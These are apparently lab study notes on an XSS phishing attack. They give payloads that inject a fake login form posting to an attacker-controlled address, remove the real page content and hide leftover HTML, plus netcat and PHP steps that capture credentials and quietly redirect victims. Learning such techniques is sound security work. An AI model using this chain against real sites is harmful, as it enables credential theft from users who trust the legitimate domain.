# 🔐 XSS Phishing Attack – Detailed Notes

## 1. Phishing via XSS

- **Phishing** = tricking users into giving sensitive data (username, password).
    
- In **XSS phishing**, attacker:
    
    - Injects **fake login form** into vulnerable website.
        
    - Victim trusts site → enters credentials.
        
    - Data sent to attacker server.
        

✔ Advantage: Victim trusts the **legitimate website domain**.

---

## 2. XSS Discovery (Finding Vulnerability)

### Target:

```
/phishing/index.php?url=INPUT
```

### Step:

- Try basic payload:
    

```html
<script>alert(window.origin)</script>
```

❌ Didn’t work → means filtering or context issue.

### Key Idea:

- Check **how input is reflected in HTML source**
    
- Then craft payload accordingly (attribute/context-based XSS)
    

---

## 3. Injecting Fake Login Form

### Goal:

Display fake login form using XSS

### HTML Form:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
  <input type="username" name="username">
  <input type="password" name="password">
  <input type="submit">
</form>
```

### Inject using JavaScript:

```javascript
document.write('<form ... >...</form>');
```

✔ Converts XSS into **UI phishing attack**

---

## 4. Removing Original Page Content

### Problem:

- Original URL input still visible → suspicious
    

### Solution:

```javascript
document.getElementById('urlform').remove();
```

✔ Makes page look **legitimate login page**

---

## 5. Clean Injection (Hide Remaining HTML)

### Problem:

- Extra HTML remains
    

### Solution:

```html
<!--
```

✔ Comments out remaining code

---

## 6. Final XSS Payload Logic

```javascript
document.write('LOGIN FORM HTML');
document.getElementById('urlform').remove();
```

- Append:
    

```html
<!--
```

✔ Result: Clean phishing page

## 7. Credential Stealing (Netcat)

### Start listener:

```bash
sudo nc -lvnp 80
```

### When victim logs in:

```
GET /?username=test&password=test
```

✔ Credentials captured in URL

❌ Issue:

- Victim sees error → suspicious
    

---

## 8. Better Method (Stealthy PHP Server)

### PHP Script:

```php
if (isset($_GET['username']) && isset($_GET['password'])) {
  save creds;
  redirect to original page;
}
```

### Run server:

```bash
php -S 0.0.0.0:80
```

✔ Benefits:

- Logs credentials
    
- Redirects victim → no suspicion
    

---

## 9. Attack Flow (Full Chain)

1. Find XSS vulnerability
    
2. Inject fake login form
    
3. Remove real content
    
4. Send malicious URL to victim
    
5. Victim enters credentials
    
6. Credentials sent to attacker server
    
7. Victim redirected → thinks login worked
    

---

## 10. Key Functions Used

| Function                    | Purpose               |
| --------------------------- | --------------------- |
| `document.write()`          | Inject HTML           |
| `getElementById().remove()` | Remove elements       |
| HTML `form action`          | Send data to attacker |
| PHP `fopen/fputs`           | Store credentials     |

---

## 11. Important Concepts

- **Reflected XSS** used here
    
- Works via **malicious URL**
    
- Uses **social engineering + technical exploit**
    
- Very effective in **trusted environments**
